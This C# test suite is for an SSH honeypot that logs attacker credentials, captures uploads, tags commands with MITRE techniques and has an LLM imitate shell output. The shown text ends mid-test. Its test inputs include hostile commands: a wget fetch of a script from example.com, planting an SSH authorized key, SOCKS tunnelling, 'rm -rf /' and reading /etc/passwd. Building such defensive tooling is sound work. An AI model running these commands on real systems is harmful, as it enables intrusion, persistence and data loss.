using Xunit;

namespace FunnyPot.Tests;

public class InputValidatorTests
{
    [Fact]
    public void Validate_NullInput_ReturnsFalse()
    {
        var result = InputValidator.Validate(null!);
        Assert.False(result.isValid);
        Assert.Equal("Input empty", result.error);
    }

    [Fact]
    public void Validate_EmptyInput_ReturnsFalse()
    {
        var result = InputValidator.Validate("");
        Assert.False(result.isValid);
        Assert.Equal("Input empty", result.error);
    }

    [Fact]
    public void Validate_WhitespaceInput_ReturnsTrue()
    {
        var result = InputValidator.Validate("   ");
        Assert.True(result.isValid);
    }

    [Fact]
    public void Validate_ExceedsMaxLength_ReturnsFalse()
    {
        var longInput = new string('a', InputValidator.MaxInputLength + 1);
        var result = InputValidator.Validate(longInput);
        Assert.False(result.isValid);
        Assert.Contains("Input too long", result.error);
    }

    [Fact]
    public void Validate_AtMaxLength_ReturnsTrue()
    {
        var sb = new System.Text.StringBuilder(InputValidator.MaxInputLength);
        for (int i = 0; i < InputValidator.MaxInputLength; i++)
            sb.Append(i % 2 == 0 ? 'a' : 'b');
        var result = InputValidator.Validate(sb.ToString());
        Assert.True(result.isValid);
    }

    [Fact]
    public void Validate_ContainsNullByte_ReturnsFalse()
    {
        var input = "test\0data";
        var result = InputValidator.Validate(input);
        Assert.False(result.isValid);
        Assert.Equal("Binary content not allowed", result.error);
    }

    [Fact]
    public void Validate_NoNullBytes_ReturnsTrue()
    {
        var result = InputValidator.Validate("正常输入");
        Assert.True(result.isValid);
    }

    [Fact]
    public void Validate_RepetitiveCharsExceedsLimit_ReturnsFalse()
    {
        var input = new string('a', InputValidator.MaxRepetitiveChars + 1);
        var result = InputValidator.Validate(input);
        Assert.False(result.isValid);
        Assert.Equal("Repetitive input detected", result.error);
    }

    [Fact]
    public void Validate_ValidRepetitiveInput_ReturnsTrue()
    {
        var input = new string('a', InputValidator.MaxRepetitiveChars);
        var result = InputValidator.Validate(input);
        Assert.True(result.isValid);
    }

    [Fact]
    public void Validate_NormalCommand_ReturnsTrue()
    {
        var result = InputValidator.Validate("ls -la /home");
        Assert.True(result.isValid);
    }

    [Fact]
    public void Validate_ValidLongInput_ReturnsTrue()
    {
        var input = "ls -la /home/user/documents/projects/codebase/src/modules/utilities/helpers/";
        var result = InputValidator.Validate(input);
        Assert.True(result.isValid);
    }
}

public class SCPDetectorTests
{
    [Theory]
    [InlineData("scp", true)]
    [InlineData("SCP", true)]
    [InlineData("scp -t somefile", true)]
    [InlineData("scp -f somefile", true)]
    [InlineData("sftp", true)]
    [InlineData("SFTP", true)]
    [InlineData("ssh -D 1080 host", false)]
    [InlineData("ssh user@host", false)]
    [InlineData("ls -la", false)]
    [InlineData("cat file.txt", false)]
    [InlineData("cd /home", false)]
    [InlineData("rm -rf /", false)]
    [InlineData("git commit -m 'fix'", false)]
    [InlineData("grep -r 'foo' .", false)]
    [InlineData("tar -cf archive.tar .", false)]
    public void IsSCPCommand_DetectsCorrectly(string input, bool expected)
    {
        var result = SCPDetector.IsSCPCommand(input);
        Assert.Equal(expected, result);
    }
}

public class SCPUploadSessionTests
{
    [Fact]
    public void HandleData_CapturesBinaryUploadToLogDirectory()
    {
        var previousLogDir = Program.LogDir;
        var tempDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N"));
        Program.LogDir = tempDir;

        try
        {
            var session = new SCPUploadSession("abcdef123456", "fallback.bin");
            var acks = new List<byte[]>();
            var closeReasons = new List<string>();
            var payload = new byte[] { 0, 1, 2, 255, 10 };
            var packet = new byte["C0644 5 payload.bin\n"u8.Length + payload.Length + 1];
            "C0644 5 payload.bin\n"u8.CopyTo(packet);
            payload.CopyTo(packet.AsSpan("C0644 5 payload.bin\n"u8.Length));
            packet[^1] = 0;

            session.HandleData(packet, acks.Add, closeReasons.Add);

            Assert.Equal("SCPUploadCaptured", Assert.Single(closeReasons));
            Assert.Equal(2, acks.Count);
            Assert.All(acks, ack => Assert.Equal(new byte[] { 0 }, ack));

            var uploadDir = Path.Combine(tempDir, "uploads", "abcdef12");
            var path = Assert.Single(Directory.GetFiles(uploadDir, "*_payload.bin"));
            Assert.Equal(payload, File.ReadAllBytes(path));
        }
        finally
        {
            Program.LogDir = previousLogDir;
            if (Directory.Exists(tempDir))
                Directory.Delete(tempDir, recursive: true);
        }
    }

    [Fact]
    public void HandleData_RejectsUploadsLargerThanFiveMegabytes()
    {
        var previousLogDir = Program.LogDir;
        var tempDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N"));
        Program.LogDir = tempDir;

        try
        {
            var session = new SCPUploadSession("abcdef123456", "fallback.bin");
            var closeReasons = new List<string>();
            var header = $"C0644 {SCPUploadHandler.MaxUploadBytes + 1} payload.bin\n";

            session.HandleData(System.Text.Encoding.ASCII.GetBytes(header), _ => { }, closeReasons.Add);

            Assert.Equal("SCPUploadTooLarge", Assert.Single(closeReasons));
            Assert.False(Directory.Exists(Path.Combine(tempDir, "uploads", "abcdef12")));
        }
        finally
        {
            Program.LogDir = previousLogDir;
            if (Directory.Exists(tempDir))
                Directory.Delete(tempDir, recursive: true);
        }
    }
}

public class DataHarvesterTests
{
    [Fact]
    public void LevenshteinDistance_DetectsPasswordMutation()
    {
        var distance = DataHarvester.LevenshteinDistance("root:password1", "root:password2");
        Assert.Equal(1, distance);
    }

    [Fact]
    public void AnalyzeCommand_ExtractsPayloadAndDiscoverySignals()
    {
        var analysis = DataHarvester.AnalyzeCommand("cat /etc/passwd; wget http://example.com/a.sh -O /tmp/a.sh");

        Assert.Equal(1, analysis.DiscoveryDepthScore);
        Assert.Contains("http://example.com/a.sh", analysis.PayloadUrls);
        Assert.Contains("Command and Control", analysis.MitreAttackTechniques);
        Assert.Contains("Discovery", analysis.MitreAttackTechniques);
    }

    [Fact]
    public void AnalyzeCommand_DetectsPersistenceAndTunneling()
    {
        var analysis = DataHarvester.AnalyzeCommand("echo key >> ~/.ssh/authorized_keys && ssh -D 1080 host");

        Assert.Equal("ssh_authorized_keys", analysis.PersistenceVector);
        Assert.Equal("dynamic_forward", analysis.TunnelingIntent);
        Assert.True(analysis.AssetValuePerceptionScore > 0);
    }

    [Fact]
    public void AnalyzeCommand_ClassifiesRouterOsProbeAsReconnaissance()
    {
        var analysis = DataHarvester.AnalyzeCommand("/ip cloud print");

        Assert.Equal("mikrotik_routeros_probe", analysis.ReconnaissanceProbe);
        Assert.Contains("Reconnaissance", analysis.MitreAttackTechniques);
    }

    [Theory]
    [InlineData("uname -s -m")]
    [InlineData("/bin/./uname -s -v -n -r -m")]
    [InlineData("ifconfig")]
    [InlineData("ip addr show")]
    [InlineData("whoami")]
    public void AnalyzeCommand_ClassifiesHostAndNetworkEnumerationAsDiscovery(string command)
    {
        var analysis = DataHarvester.AnalyzeCommand(command);

        Assert.True(analysis.DiscoveryDepthScore > 0);
        Assert.Contains("Discovery", analysis.MitreAttackTechniques);
    }

    [Fact]
    public void AnalyzeCommand_DoesNotClassifyToolVersionCheckAsCommandAndControl()
    {
        var analysis = DataHarvester.AnalyzeCommand("curl --version");

        Assert.DoesNotContain("Command and Control", analysis.MitreAttackTechniques);
    }

    [Fact]
    public void CalculateFingerprintHash_IsDeterministicAndNormalizesInput()
    {
        var first = DataHarvester.CalculateFingerprintHash("SSH-2.0-Client", "RSA-SHA2-512", "AA:BB");
        var second = DataHarvester.CalculateFingerprintHash("ssh-2.0-client", "rsa-sha2-512", "aa:bb");

        Assert.Equal(first, second);
        Assert.Equal(64, first.Length);
    }

    [Fact]
    public void IsFailureResponse_DoesNotTreatGenericErrorWordAsFailure()
    {
        Assert.False(DataHarvester.IsFailureResponse("/var/log/error.log"));
        Assert.True(DataHarvester.IsFailureResponse("bash: nope: command not found"));
    }

    [Fact]
    public void ShellSessionAnalytics_TracksFailureRatioAndSemanticDrift()
    {
        var analytics = new ShellSessionAnalytics { SessionStartedAt = DateTime.UtcNow.AddSeconds(-10) };

        analytics.RecordCommand(DataHarvester.AnalyzeCommand("ls"));
        analytics.RecordResult(false);
        analytics.RecordCommand(DataHarvester.AnalyzeCommand("cat /etc/passwd | grep root && wget http://example.com/a.sh"));
        analytics.RecordResult(true);

        Assert.Equal(0.5, analytics.StandardErrorRatio);
        Assert.True(analytics.SemanticDrift > 0);
        Assert.Contains("Command and Control", analytics.MitreTechniqueCounts.Keys);
        Assert.True(analytics.CalculateTuringMultiplier() > 0);
    }
}

public class LoggerTests
{
    [Fact]
    public void GetSessionLogUniquePart_HandlesShortSessionIds()
    {
        Assert.Equal("abc", Logger.GetSessionLogUniquePart("default", "abc"));
        Assert.Equal("abcdefgh", Logger.GetSessionLogUniquePart("default", "abcdefghijk"));
        Assert.Equal("custom", Logger.GetSessionLogUniquePart("custom", "abcdefghijk"));
    }

    [Fact]
    public void ShouldRequestDataPush_AllowsInitialAndElapsedRequests()
    {
        var now = DateTime.UtcNow;
        var interval = TimeSpan.FromMinutes(5);

        Assert.True(Logger.ShouldRequestDataPush(now, DateTime.MinValue, interval, force: false));
        Assert.True(Logger.ShouldRequestDataPush(now, now.AddMinutes(-6), interval, force: false));
    }

    [Fact]
    public void ShouldRequestDataPush_DebouncesNonBoundaryEvents()
    {
        var now = DateTime.UtcNow;
        var interval = TimeSpan.FromMinutes(5);

        Assert.False(Logger.ShouldRequestDataPush(now, now.AddMinutes(-1), interval, force: false));
        Assert.True(Logger.ShouldRequestDataPush(now, now.AddMinutes(-1), interval, force: true));
    }

    [Fact]
    public void ApplyHarvestSummaryEvent_TracksUniqueScanIpsAndShells()
    {
        var summary = new HarvestSummary();
        var timestamp = DateTime.UtcNow;

        Logger.ApplyHarvestSummaryEvent(summary, "auth_attempt", new AuthAttemptLogEntry { RemoteEndpoint = "203.0.113.5:49152", Username = "root", Password = "admin" }, timestamp);
        Logger.ApplyHarvestSummaryEvent(summary, "auth_attempt", new AuthAttemptLogEntry { RemoteEndpoint = "203.0.113.5:49153", Username = "root", Password = "admin" }, timestamp);
        Logger.ApplyHarvestSummaryEvent(summary, "auth_attempt", new AuthAttemptLogEntry { RemoteEndpoint = "198.51.100.7:22", Username = "support", Password = "password" }, timestamp);
        Logger.ApplyHarvestSummaryEvent(summary, "shell_session_start", new SessionLogEntry(), timestamp);

        Assert.Equal(3, summary.TotalScanAttempts);
        Assert.Equal(2, summary.UniqueScanIps);
        Assert.Equal(2, summary.ScansByIp["203.0.113.5"]);
        Assert.Equal(1, summary.ScansByIp["198.51.100.7"]);
        Assert.Equal(2, summary.TopUsernames["root"]);
        Assert.Equal(1, summary.TopUsernames["support"]);
        Assert.Equal(2, summary.TopPasswords["admin"]);
        Assert.Equal(1, summary.TopPasswords["password"]);
        Assert.Equal(1, summary.TotalShells);
    }
}

public class ProgramTests
{
    [Theory]
    [InlineData("203.0.113.5:49152", "203.0.113.5")]
    [InlineData("[2001:db8::1]:49152", "2001:db8::1")]
    [InlineData("unknown", "unknown")]
    public void GetRemoteAttemptKey_UsesIpWithoutSourcePort(string remoteEndpoint, string expected)
    {
        Assert.Equal(expected, Program.GetRemoteAttemptKey(remoteEndpoint));
    }

    [Fact]
    public void GetIntEnvironmentOrDefault_UsesValidEnvironmentValue()
    {
        var name = $"FUNNYPOT_TEST_INT_{Guid.NewGuid():N}";
        Environment.SetEnvironmentVariable(name, "22722");

        try
        {
            Assert.Equal(22722, Program.GetIntEnvironmentOrDefault(name, 22422));
        }
        finally
        {
            Environment.SetEnvironmentVariable(name, null);
        }
    }

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("not-a-number")]
    public void GetIntEnvironmentOrDefault_FallsBackForMissingOrInvalidValue(string? value)
    {
        var name = $"FUNNYPOT_TEST_INT_{Guid.NewGuid():N}";
        Environment.SetEnvironmentVariable(name, value);

        try
        {
            Assert.Equal(22422, Program.GetIntEnvironmentOrDefault(name, 22422));
        }
        finally
        {
            Environment.SetEnvironmentVariable(name, null);
        }
    }
}

public class CommandResolverTests
{
    [Fact]
    public void CommandResponseStore_LoadsExactOrdinalKeysAndEmptyResponses()
    {
        var path = CreateStoreFile(new Dictionary<string, string>
        {
            ["true"] = "",
            ["echo A"] = "A"
        });

        try
        {
            var store = CommandResponseStore.Load(path);

            Assert.True(store.TryGet("true", out var empty));
            Assert.Equal("", empty.Response);
            Assert.True(store.TryGet("echo A", out var exact));
            Assert.Equal("A", exact.Response);
            Assert.False(store.TryGet("echo a", out _));
            Assert.False(store.TryGet("echo A ", out _));
        }
        finally
        {
            File.Delete(path);
        }
    }

    [Fact]
    public async Task CommandResponseStore_LearnsAndPersistsLlmResponses()
    {
        var path = CreateStoreFile(new Dictionary<string, string>());
        try
        {
            var store = CommandResponseStore.Load(path);

            Assert.True(await store.TryLearnAsync("new-command", "generated", "test-model"));
            Assert.True(store.TryGet("new-command", out var learned));
            Assert.Equal("generated", learned.Response);
            Assert.Equal("llm", learned.Origin);
            Assert.Equal("test-model", learned.LlmModel);
            Assert.NotNull(learned.UpdatedAtUtc);

            var reloaded = CommandResponseStore.Load(path);
            Assert.True(reloaded.TryGet("new-command", out var persisted));
            Assert.Equal("generated", persisted.Response);
            Assert.Equal("test-model", persisted.LlmModel);
        }
        finally
        {
            File.Delete(path);
            File.Delete(path + ".tmp");
        }
    }

    [Fact]
    public async Task CommandResponseStore_ConcurrentUpdatesDoNotLoseEntries()
    {
        var path = CreateStoreFile(new Dictionary<string, string>());
        try
        {
            var store = CommandResponseStore.Load(path);
            await Task.WhenAll(Enumerable.Range(0, 12)
                .Select(index => store.TryLearnAsync($"command-{index}", $"response-{index}", "test-model")));

            Assert.Equal(12, store.Count);
            Assert.Equal(12, CommandResponseStore.Load(path).Count);
            using var _ = System.Text.Json.JsonDocument.Parse(File.ReadAllText(path));
        }
        finally
        {
            File.Delete(path);
            File.Delete(path + ".tmp");
        }
    }

    [Fact]
    public async Task ResolveCommand_CacheHitDoesNotCallLlm()
    {
        var path = CreateStoreFile(new Dictionary<string, string> { ["uname -a"] = "cached uname" });
        try
        {
            Program.CommandResponses = CommandResponseStore.Load(path);
            var calls = 0;
            var result = await CommandResolver.ResolveCommandAsync(
                "uname -a",
                "session",
                FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N")),
                [],
                CancellationToken.None,
                (_, _) =>
                {
                    calls++;
                    return Task.FromResult(("unexpected", 1, 1, 2, "test-model"));
                });

            Assert.Equal("cached uname", result.response);
            Assert.Equal("cache", result.responseSource);
            Assert.True(result.usedStatic);
            Assert.Equal(0, calls);
        }
        finally
        {
            File.Delete(path);
        }
    }

    [Fact]
    public async Task ResolveCommand_CacheMissCallsLlmAndLearnsResponse()
    {
        var path = CreateStoreFile(new Dictionary<string, string>());
        try
        {
            Program.CommandResponses = CommandResponseStore.Load(path);
            var calls = 0;
            Task<(string response, int promptTokens, int completionTokens, int totalTokens, string model)> Provider(
                List<ChatRequestData.ChatMessage> _, CancellationToken __)
            {
                calls++;
                return Task.FromResult(("generated output", 4, 2, 6, "test-model"));
            }

            var first = await CommandResolver.ResolveCommandAsync(
                "uncached command", "session", FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N")), [], CancellationToken.None, Provider);
            var second = await CommandResolver.ResolveCommandAsync(
                "uncached command", "session", FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N")), [], CancellationToken.None, Provider);

            Assert.Equal("generated output", first.response);
            Assert.Equal("llm", first.responseSource);
            Assert.False(first.usedStatic);
            Assert.Equal("generated output", second.response);
            Assert.Equal("cache", second.responseSource);
            Assert.Equal("test-model", second.llmModel);
            Assert.Equal(1, calls);
        }
        finally
        {
            File.Delete(path);
            File.Delete(path + ".tmp");
        }
    }

    [Fact]
    public async Task ResolveCommand_LongExplorationChainUsesSeededSegmentsWithoutLlm()
    {
        var path = CreateStoreFile(new Dictionary<string, string> { ["uname -r"] = "2.6.32-5-amd64" });
        try
        {
            Program.CommandResponses = CommandResponseStore.Load(path);
            const string command = "echo 'KERNEL:'; uname -r; uname -r; uname -r; uname -r; uname -r; uname -r; uname -r; uname -r; uname -r; uname -r; uname -r";
            var calls = 0;
            var result = await CommandResolver.ResolveCommandAsync(command, "session",
                FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N")), [], CancellationToken.None,
                (_, _) =>
                {
                    calls++;
                    return Task.FromResult(("unexpected", 0, 0, 0, "test-model"));
                });

            Assert.Equal("compound cache", result.responseSource);
            Assert.StartsWith("KERNEL:\r\n2.6.32-5-amd64", result.response);
            Assert.Equal(0, calls);
            Assert.False(Program.CommandResponses.TryGet(command, out _));
        }
        finally
        {
            File.Delete(path);
        }
    }

    [Theory]
    [InlineData("echo 'KERNEL:'; uname -r && id")]
    [InlineData("echo 'KERNEL:'; unknown-command")]
    [InlineData("echo 'KERNEL:'; uname -r | cat")]
    [InlineData("echo '$HOME'; uname -r")]
    public async Task ResolveCommand_UnsupportedChainsUseWholeCommandLlm(string command)
    {
        var path = CreateStoreFile(new Dictionary<string, string> { ["uname -r"] = "2.6.32-5-amd64" });
        try
        {
            Program.CommandResponses = CommandResponseStore.Load(path);
            var calls = 0;
            var result = await CommandResolver.ResolveCommandAsync(command, "session",
                FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N")), [], CancellationToken.None,
                (_, _) =>
                {
                    calls++;
                    return Task.FromResult(("KERNEL: result", 0, 0, 0, "test-model"));
                });

            Assert.Equal("llm", result.responseSource);
            Assert.Equal(1, calls);
        }
        finally
        {
            File.Delete(path);
            File.Delete(path + ".tmp");
        }
    }

    [Fact]
    public async Task ResolveCommand_ExcessiveExplorationChainReturnsPlausibleBufferError()
    {
        var path = CreateStoreFile(new Dictionary<string, string>());
        try
        {
            Program.CommandResponses = CommandResponseStore.Load(path);
            var command = string.Join("; ", Enumerable.Repeat("echo 'test'", 33));
            var result = await CommandResolver.ResolveCommandAsync(command, "session",
                FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N")), [], CancellationToken.None,
                (_, _) => throw new Exception("LLM should not be called"));

            Assert.Contains("terminal buffer", result.response);
            Assert.Equal("compound cache", result.responseSource);
        }
        finally
        {
            File.Delete(path);
        }
    }

    [Fact]
    public async Task ResolveCommand_DoesNotLearnModelFailures()
    {
        var path = CreateStoreFile(new Dictionary<string, string>());
        try
        {
            Program.CommandResponses = CommandResponseStore.Load(path);
            var result = await CommandResolver.ResolveCommandAsync(
                "failed command",
                "session",
                FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N")),
                [],
                CancellationToken.None,
                (_, _) => Task.FromResult(("[api error] unavailable", 0, 0, 0, "test-model")));

            Assert.Equal("[api error] unavailable", result.response);
            Assert.Equal("llm", result.responseSource);
            Assert.False(Program.CommandResponses.TryGet("failed command", out _));
        }
        finally
        {
            File.Delete(path);
        }
    }

    [Fact]
    public async Task ResolveCommand_RepairsCompoundOutputBeforeLearning()
    {
        var path = CreateStoreFile(new Dictionary<string, string>());
        try
        {
            Program.CommandResponses = CommandResponseStore.Load(path);
            var responses = new Queue<(string response, int promptTokens, int completionTokens, int totalTokens, string model)>(
            [
                ("2", 3, 1, 4, "first-model"),
                ("ARCH:x86_64\nCPUS:2", 5, 2, 7, "repair-model")
            ]);
            var history = new List<ChatRequestData.ChatMessage>();
            const string command = "arch=$(uname -m); cpus=$(nproc); echo \"ARCH:$arch\"; echo \"CPUS:$cpus\"";

            var result = await CommandResolver.ResolveCommandAsync(
                command,
                "session",
                FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N")),
                history,
                CancellationToken.None,
                (_, _) => Task.FromResult(responses.Dequeue()));

            Assert.Equal("ARCH:x86_64\r\nCPUS:2", result.response);
            Assert.Equal("repair-model", result.llmModel);
            Assert.True(Program.CommandResponses.TryGet(command, out var learned));
            Assert.Equal("repair-model", learned.LlmModel);
            Assert.Empty(history);
        }
        finally
        {
            File.Delete(path);
        }
    }

    [Fact]
    public async Task ResolveCommand_ScpRemainsAProtocolException()
    {
        var path = CreateStoreFile(new Dictionary<string, string>());
        try
        {
            Program.CommandResponses = CommandResponseStore.Load(path);
            var calls = 0;
            var result = await CommandResolver.ResolveCommandAsync(
                "scp -t /tmp/file",
                "session",
                FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N")),
                [],
                CancellationToken.None,
                (_, _) =>
                {
                    calls++;
                    return Task.FromResult(("unexpected", 0, 0, 0, "test-model"));
                });

            Assert.Equal("", result.response);
            Assert.Equal("scp", result.responseSource);
            Assert.Equal(0, calls);
        }
        finally
        {
            File.Delete(path);
        }
    }

    [Theory]
    [InlineData("cat /etc/passwd && uname -a", true)]
    [InlineData("echo 'a;b'", false)]
    [InlineData("echo \"a|b\"", false)]
    public void IsCompoundShellCommand_HandlesQuotedOperators(string command, bool expected)
    {
        Assert.Equal(expected, CommandResolver.IsCompoundShellCommand(command));
    }

    [Fact]
    public void CommandResponseSeed_IsAValidJsonDictionary()
    {
        var path = Path.GetFullPath(Path.Combine(AppContext.BaseDirectory, "../../../../FunnyPot/data/command_responses.json"));
        var store = CommandResponseStore.Load(path);

        Assert.True(store.Count >= 100);
        Assert.True(store.TryGet("cd ~; chattr -ia .ssh; lockr -ia .ssh", out var response));
        Assert.Contains("while trying to stat .ssh", response.Response);
        using var document = System.Text.Json.JsonDocument.Parse(File.ReadAllText(path));
        Assert.DoesNotContain(document.RootElement.EnumerateObject(), entry =>
            CommandResponseStore.IsModelRefusal(entry.Value.GetProperty("response").GetString() ?? "") ||
            CommandResponseStore.IsIncompleteSudoFallback(entry.Name, entry.Value.GetProperty("response").GetString() ?? ""));
        foreach (var candidate in new[] { "1234", "123456789" })
        {
            var matching = document.RootElement.EnumerateObject().Single(entry =>
                entry.Name.StartsWith($"echo '{candidate}' | sudo -S sh -c", StringComparison.Ordinal));
            Assert.Equal("96", matching.Value.GetProperty("response").GetString());
            Assert.Equal("seed", matching.Value.GetProperty("origin").GetString());
        }
    }

    [Fact]
    public async Task ResolveCommand_ModelRefusalIsNotReturnedOrLearned()
    {
        var path = CreateStoreFile(new Dictionary<string, string>());
        try
        {
            Program.CommandResponses = CommandResponseStore.Load(path);
            Assert.False(await Program.CommandResponses.TryLearnAsync("new refusal", "Sorry, I can't execute commands.", "model"));
            var calls = 0;
            var result = await CommandResolver.ResolveCommandAsync("uncached refusal", "session",
                FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N")), [], CancellationToken.None,
                (_, _) =>
                {
                    calls++;
                    return Task.FromResult(("Sorry, I can't execute commands.", 0, 0, 0, "model"));
                });
            Assert.Equal("model failure", result.responseSource);
            Assert.Equal("bash: fork: Resource temporarily unavailable", result.response);
            Assert.Equal(2, calls);
            Assert.False(Program.CommandResponses.TryGet("uncached refusal", out _));
        }
        finally
        {
            File.Delete(path);
        }
    }

    [Fact]
    public async Task ResolveCommand_RefusalRetryCanProduceTerminalAnswer()
    {
        var path = CreateStoreFile(new Dictionary<string, string>());
        try
        {
            Program.CommandResponses = CommandResponseStore.Load(path);
            var calls = 0;
            var result = await CommandResolver.ResolveCommandAsync("uname -r", "session",
                FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N")), [], CancellationToken.None,
                (_, _) => Task.FromResult((++calls == 1
                    ? "Sorry, I can't simulate a shell."
                    : Program.KernelRelease, 0, 0, 0, "model")));
            Assert.Equal(2, calls);
            Assert.Equal(Program.KernelRelease, result.response);
            Assert.True(Program.CommandResponses.TryGet("uname -r", out _));
        }
        finally
        {
            File.Delete(path);
        }
    }

    [Fact]
    public async Task ResolveCommand_BadNewSudoAnswerIsRepairedBeforeLearning()
    {
        const string command = "echo 'wrong' | sudo -S sh -c 'nproc' || nproc";
        var path = CreateStoreFile(new Dictionary<string, string> { ["nproc"] = "96" });
        try
        {
            Program.CommandResponses = CommandResponseStore.Load(path);
            var calls = 0;
            var result = await CommandResolver.ResolveCommandAsync(command, "session",
                FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N")), [], CancellationToken.None,
                (_, _) => Task.FromResult((++calls == 1 ? "sudo: 3 incorrect password attempts" : "96", 0, 0, 0, "model")));
            Assert.Equal("llm", result.responseSource);
            Assert.Equal("96", result.response);
            Assert.Equal(2, calls);
            Assert.True(Program.CommandResponses.TryGet(command, out var stored));
            Assert.Equal("96", stored.Response);
        }
        finally
        {
            File.Delete(path);
        }
    }

    [Fact]
    public void HostFingerprintCache_MatchesPublishedComputePersona()
    {
        var path = Path.GetFullPath(Path.Combine(AppContext.BaseDirectory, "../../../../FunnyPot/data/command_responses.json"));
        var store = CommandResponseStore.Load(path);
        Assert.True(store.TryGet("uname -a", out var kernel));
        Assert.Contains(Program.KernelRelease, kernel.Response);
        Assert.True(store.TryGet("cat /etc/os-release", out var os));
        Assert.Contains("OmegaBlack Compute OS 6.0", os.Response);
        Assert.True(store.TryGet("df -h", out var disk));
        Assert.Contains("/srv/data", disk.Response);
        Assert.True(store.TryGet("free", out var memory));
        Assert.Contains("268435456", memory.Response);
        Assert.True(store.TryGet("nvidia-smi -q | grep \"Attached GPUs\" | awk '{print $4}' && echo '' || echo 'No'", out var gpu));
        Assert.Equal("2", gpu.Response);
        Assert.True(store.TryGet("nproc", out var processors));
        Assert.Equal("96", processors.Response);
        Assert.True(store.TryGet("cat /proc/cpuinfo", out var cpuInfo));
        Assert.Equal(96, cpuInfo.Response.Split("processor\t:", StringSplitOptions.None).Length - 1);

        using var cpuCache = System.Text.Json.JsonDocument.Parse(File.ReadAllText(path));
        foreach (var entry in cpuCache.RootElement.EnumerateObject().Where(entry => entry.Name.Contains("nproc", StringComparison.Ordinal)))
        {
            var value = entry.Value.GetProperty("response").GetString() ?? "";
            Assert.True(value == "96" || value.Contains("CPUS:96", StringComparison.Ordinal) || value.EndsWith("|96", StringComparison.Ordinal));
            Assert.Equal("seed", entry.Value.GetProperty("origin").GetString());
        }

        var fs = FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N"));
        Assert.Equal(os.Response, fs.ReadFile("/etc/os-release"));
        Assert.Contains("/srv/data", fs.ReadFile("/etc/fstab"));
        Assert.Contains("268435456 kB", fs.ReadFile("/proc/meminfo"));
        var prompt = Program.BuildSystemPrompt("remote");
        Assert.Contains("NVIDIA A100-SXM4-80GB", prompt);
        Assert.Contains("96 logical processors", prompt);
        Assert.Contains("`cat /proc/cpuinfo | grep name | wc -l` returns `96`", prompt);
        Assert.Contains("- cpu_count: 96", Program.BuildCommandUserPrompt("arch=$(uname -m); cpus=$(nproc); echo CPUS:$cpus"));
        Assert.Contains(Program.KernelRelease, prompt);
    }

    [Fact]
    public void NormalizeTerminalOutput_RemovesShellPrompt()
    {
        var normalized = Program.NormalizeTerminalOutput("remote@omegablack:/tmp$ uname -a\n");

        Assert.Equal("uname -a", normalized);
    }

    [Fact]
    public void BuildCommandUserPrompt_RequiresRawTerminalOutput()
    {
        var prompt = Program.BuildCommandUserPrompt("uname -a");

        Assert.Contains("Execute this exact Bash command", prompt);
        Assert.Contains("raw terminal stdout/stderr only", prompt);
    }

    [Fact]
    public void BuildApiUrl_JoinsBaseAndEndpoint()
    {
        Assert.Equal("https://openrouter.ai/api/v1/chat/completions", Program.BuildApiUrl("https://openrouter.ai/api/v1/", "/chat/completions"));
    }

    [Fact]
    public void TryParseOpenRouterResponse_ExtractsContentAndUsage()
    {
        using var doc = System.Text.Json.JsonDocument.Parse("""
            {
              "choices": [{ "message": { "content": "ok" } }],
              "usage": { "prompt_tokens": 10, "completion_tokens": 2, "total_tokens": 12 }
            }
            """);

        Assert.True(Program.TryParseOpenRouterResponse(doc.RootElement, out var content, out var promptTokens, out var completionTokens, out var totalTokens));
        Assert.Equal("ok", content);
        Assert.Equal(10, promptTokens);
        Assert.Equal(2, completionTokens);
        Assert.Equal(12, totalTokens);
    }

    [Fact]
    public async Task ResolveCommand_CanonicalTemplateHitHydratesChangedTokensWithoutCallingLlm()
    {
        var path = CreateStoreFile(new Dictionary<string, string>
        {
            ["echo XMFpxdSkJf && cd /tmp; echo bGUis6OuDN > PaqKinutXw && sleep 114 &"] = "XMFpxdSkJf",
            ["head -c 1458464 > /tmp/GiXvs1egbe"] = "head: missing operand after ‘/tmp/GiXvs1egbe’\r\nTry ‘head --help’ for more information."
        });
        try
        {
            Program.CommandResponses = CommandResponseStore.Load(path);
            var calls = 0;

            var canaryResult = await CommandResolver.ResolveCommandAsync(
                "echo Z9kLmP4xQw && cd /tmp; echo rT8vBn2mKl > Qw9ErTyUiO && sleep 345 &",
                "session",
                FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N")),
                [],
                CancellationToken.None,
                (_, _) =>
                {
                    calls++;
                    return Task.FromResult(("unexpected", 1, 1, 2, "test-model"));
                });

            var headResult = await CommandResolver.ResolveCommandAsync(
                "head -c 1458464 > /tmp/NewTmp9876",
                "session",
                FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N")),
                [],
                CancellationToken.None,
                (_, _) =>
                {
                    calls++;
                    return Task.FromResult(("unexpected", 1, 1, 2, "test-model"));
                });

            Assert.Equal("Z9kLmP4xQw", canaryResult.response);
            Assert.Equal("cache", canaryResult.responseSource);
            Assert.Contains("/tmp/NewTmp9876", headResult.response);
            Assert.Equal("cache", headResult.responseSource);
            Assert.Equal(0, calls);
        }
        finally
        {
            File.Delete(path);
        }
    }

    [Fact]
    public async Task ResolveCommand_CompoundChainInDifferentOrderUsesStepCacheWithoutLlm()
    {
        var path = CreateStoreFile(new Dictionary<string, string>
        {
            ["uname -s"] = "Linux",
            ["id"] = "uid=1001(remote) gid=1001(users) groups=1001(users)",
            ["nproc"] = "96",
            ["hostname"] = "omegablack"
        });
        try
        {
            Program.CommandResponses = CommandResponseStore.Load(path);
            var calls = 0;

            var firstOrder = await CommandResolver.ResolveCommandAsync(
                "uname -s && id && nproc && hostname",
                "session",
